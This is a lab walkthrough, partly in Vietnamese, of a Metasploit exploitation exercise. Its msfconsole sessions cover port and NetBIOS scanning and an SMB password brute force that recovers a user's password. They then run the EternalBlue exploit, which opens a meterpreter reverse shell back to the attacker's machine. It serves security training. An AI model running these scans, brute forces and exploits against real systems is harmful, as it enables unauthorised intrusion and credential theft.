# **Metasploit: Exploitation**

## **Scanning**

> `Port Scanning`

- Metasploit có một số mô-đun để quét các cổng đang mở trên hệ thống và mạng đích. Bạn có thể liệt kê các mô-đun quét cổng tiềm năng có sẵn bằng lệnh `search portscan`.

![](./img_mi2/Screenshot%202023-07-14%20201437.png)

![](./img_mi2/Screenshot%202023-07-14%20201540.png)

    - `CONCURRENCY:` Số mục tiêu được quét đồng thời.
    - `PORTS:` Phạm vi cổng sẽ được quét. Xin lưu ý rằng 1-1000 ở đây sẽ không giống như sử dụng Nmap với cấu hình mặc định. Nmap sẽ quét 1000 cổng được sử dụng nhiều nhất, trong khi Metasploit sẽ quét số cổng từ 1 đến 10000.
    - `RHOSTS:` Mục tiêu hoặc mạng đích cần quét.
    - `THREADS:` Số lượng chủ đề sẽ được sử dụng đồng thời. Nhiều chủ đề hơn sẽ dẫn đến quét nhanh hơn.

- Bạn có thể trực tiếp thực hiện quét Nmap từ dấu nhắc msfconsole như minh họa bên dưới nhanh hơn:

![](./img_mi2/Screenshot%202023-07-14%20201710.png)

```
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


Interact with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner

msf5 > use 5
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.33.77
RHOSTS => 10.10.33.77
msf5 auxiliary(scanner/portscan/tcp) > run

[+] 10.10.33.77:          - 10.10.33.77:21 - TCP OPEN
[+] 10.10.33.77:          - 10.10.33.77:22 - TCP OPEN
[+] 10.10.33.77:          - 10.10.33.77:139 - TCP OPEN
[+] 10.10.33.77:          - 10.10.33.77:445 - TCP OPEN
[+] 10.10.33.77:          - 10.10.33.77:8000 - TCP OPEN
[*] 10.10.33.77:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Answer : 5

Using the relevant scanner, what NetBIOS name can you see ?
msf5 auxiliary(scanner/portscan/tcp) > back
msf5 > search netbios

Matching Modules
================

   #  Name                                          Disclosure Date  Rank    Check  Description
   -  ----                                          ---------------  ----    -----  -----------
   0  auxiliary/admin/netbios/netbios_spoof                          normal  No     NetBIOS Response Brute Force Spoof (Direct)
   1  auxiliary/dos/smb/smb_loris                   2017-06-29       normal  No     SMBLoris NBSS Denial of Service
   2  auxiliary/scanner/http/ntlm_info_enumeration                   normal  No     Host Information Enumeration via NTLM Authentication
   3  auxiliary/scanner/netbios/nbname                               normal  No     NetBIOS Information Discovery
   4  auxiliary/server/netbios_spoof_nat            2016-06-14       normal  No     NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)
   5  auxiliary/server/wpad                                          normal  No     WPAD.dat File Server
   6  auxiliary/spoof/llmnr/llmnr_response                           normal  No     LLMNR Spoofer
   7  auxiliary/spoof/nbns/nbns_response                             normal  No     NetBIOS Name Service Spoofer


Interact with a module by name or index, for example use 7 or use auxiliary/spoof/nbns/nbns_response

msf5 > use 3
msf5 auxiliary(scanner/netbios/nbname) > show options

Module options (auxiliary/scanner/netbios/nbname):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      137              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

msf5 auxiliary(scanner/netbios/nbname) > set RHOSTS 10.10.33.77
RHOSTS => 10.10.33.77
msf5 auxiliary(scanner/netbios/nbname) > run

[*] Sending NetBIOS requests to 10.10.33.77->10.10.33.77 (1 hosts)
[+] 10.10.33.77 [IP-10-10-33-77] OS:Unix Names:(IP-10-10-33-77, __MSBROWSE__, ACME IT SUPPORT) Addresses:(10.10.33.77) Mac:00:00:00:00:00:00 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Answer : ACME IT SUPPORT

What is running on port 8000 ?

For answering this question, i ran nmap to have the service running on port 8000 then use module scanner/http_version :

msf5 auxiliary(scanner/netbios/nbname) > back
msf5 > nmap -sS 10.10.33.77
[*] exec: nmap -sS 10.10.33.77


Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-26 08:39 BST
Nmap scan report for ip-10-10-33-77.eu-west-1.compute.internal (10.10.33.77)
Host is up (0.0014s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
MAC Address: 02:E9:BA:38:47:59 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
msf5 > search http_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/http_version                   normal  No     HTTP Version Detection

msf5 > use 0
msf5 auxiliary(scanner/http/http_version) > show options

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host

msf5 auxiliary(scanner/http/http_version) > setg RHOSTS 10.10.33.77
RHOSTS => 10.10.33.77
msf5 auxiliary(scanner/http/http_version) > set RPORT 8000
RPORT => 8000
msf5 auxiliary(scanner/http/http_version) > run

[+] 10.10.33.77:8000 webfs/1.21 ( 403-Forbidden )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Answer : webfs/1.21

What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task. 

ss

msf5 auxiliary(scanner/http/http_version) > back
msf5 > search scanner/smb

Matching Modules
================

   #   Name                                         Disclosure Date  Rank    Check  Description
   -   ----                                         ---------------  ----    -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal  No     DCOM Exec
   1   auxiliary/scanner/smb/impacket/secretsdump                    normal  No     DCOM Exec
   2   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal  No     WMI Exec
   3   auxiliary/scanner/smb/pipe_auditor                            normal  No     SMB Session Pipe Auditor
   4   auxiliary/scanner/smb/pipe_dcerpc_auditor                     normal  No     SMB Session Pipe DCERPC Auditor
   5   auxiliary/scanner/smb/psexec_loggedin_users                   normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   6   auxiliary/scanner/smb/smb1                                    normal  No     SMBv1 Protocol Detection
   7   auxiliary/scanner/smb/smb2                                    normal  No     SMB 2.0 Protocol Detection
   8   auxiliary/scanner/smb/smb_enum_gpp                            normal  No     SMB Group Policy Preference Saved Passwords Enumeration
   9   auxiliary/scanner/smb/smb_enumshares                          normal  No     SMB Share Enumeration
   10  auxiliary/scanner/smb/smb_enumusers                           normal  No     SMB User Enumeration (SAM EnumUsers)
   11  auxiliary/scanner/smb/smb_enumusers_domain                    normal  No     SMB Domain User Enumeration
   12  auxiliary/scanner/smb/smb_login                               normal  No     SMB Login Check Scanner
   13  auxiliary/scanner/smb/smb_lookupsid                           normal  No     SMB SID User Enumeration (LookupSid)
   14  auxiliary/scanner/smb/smb_ms17_010                            normal  No     MS17-010 SMB RCE Detection
   15  auxiliary/scanner/smb/smb_uninit_cred                         normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   16  auxiliary/scanner/smb/smb_version                             normal  No     SMB Version Detection


Interact with a module by name or index, for example use 16 or use auxiliary/scanner/smb/smb_version

msf5 > use 12
msf5 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS             10.10.33.77      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set SMBUser penny
SMBUser => penny
msf5 auxiliary(scanner/smb/smb_login) > ls
[*] exec: ls

MetasploitWordlist.txt
msf5 auxiliary(scanner/smb/smb_login) > set DB_ALL_PASS true
DB_ALL_PASS => true
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE MetasploitWordlist.txt
PASS_FILE => MetasploitWordlist.txt
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.33.77:445       - 10.10.33.77:445 - Starting SMB login bruteforce
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:95',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:98',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:2003',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:2008',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:111111',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:123456',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:12345678',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:1qaz2wsx',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:abc',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:abc123',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:abcd123',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:account',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:admin',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:adminadmin',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:administator',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:admins',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:air',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:alpine',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:Autumn2013',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:autumn2013',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:Autumn2014',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:autumn2014',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:Autumn2015',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:autumn2015',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:Autumn2016',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:autumn2016',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:Autumn2017',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:autumn2017',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:bankbank',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:baseball',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:basketball',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:bird',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:burp',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:change',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:changelater',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:changeme',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:company',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:company!',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:company1',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:company1!',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:company123',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:complex',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:complex1',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:complex2',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:complex3',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:complexpassword',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:database',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:default',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:dev',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:devdev',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:devdevdev',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:dirt',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:dragon',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:earth',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:fire',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:football',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:goat',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:goat',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:god',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:guessme',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:hugs',
[-] 10.10.33.77:445       - 10.10.33.77:445 - Failed: '.\penny:letmein',
[+] 10.10.33.77:445       - 10.10.33.77:445 - Success: '.\penny:leo1234'
[*] 10.10.33.77:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Answer : leo1234
```

![](./img_mi2/Screenshot%202023-07-14%20202347.png)

## **Exploitation**

- Ở đây tôi thực hiện sử dụng tool `metasploit` để thực hiện reverse shell . Các bước tôi thực hiện như sau:

  - Chọn lỗ hổng `eternalblue`
  - Set RHOST
  - Chọn payload reverse shell
  - Tiếp tục khai thác và lấy flag

```
msf5 > setg RHOSTS 10.10.215.124
RHOSTS => 10.10.215.124
msf5 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 > use 2
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.196.135:4444 
[*] 10.10.215.124:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.215.124:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.215.124:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.215.124:445 - Connecting to target for exploitation.
[+] 10.10.215.124:445 - Connection established for exploitation.
[+] 10.10.215.124:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.215.124:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.215.124:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.215.124:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.215.124:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.215.124:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.215.124:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.215.124:445 - Sending all but last fragment of exploit packet
[*] 10.10.215.124:445 - Starting non-paged pool grooming
[+] 10.10.215.124:445 - Sending SMBv2 buffers
[+] 10.10.215.124:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.215.124:445 - Sending final SMBv2 buffers.
[*] 10.10.215.124:445 - Sending last fragment of exploit packet!
[*] 10.10.215.124:445 - Receiving response from exploit packet
[+] 10.10.215.124:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.215.124:445 - Sending egg to corrupted connection.
[*] 10.10.215.124:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.215.124
[*] Meterpreter session 2 opened (10.10.196.135:4444 -> 10.10.215.124:49189) at 2021-09-26 09:39:36 +0100
[+] 10.10.215.124:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.215.124:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.215.124:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

## **Msfvenom**

- Msfvenom, thay thế Msfpayload và Msfencode, cho phép bạn tạo tải trọng.

- Msfvenom sẽ cho phép bạn truy cập tất cả các tải trọng có sẵn trong khung Metasploit. Msfvenom cho phép bạn tạo tải trọng ở nhiều định dạng khác nhau (PHP, exe, dll, elf, v.v.) và cho nhiều hệ thống đích khác nhau (Apple, Windows, Android, Linux, v.v.).

![](./img_mi2/Screenshot%202023-07-14%20210012.png)

![](./img_mi2/Screenshot%202023-07-14%20210230.png)
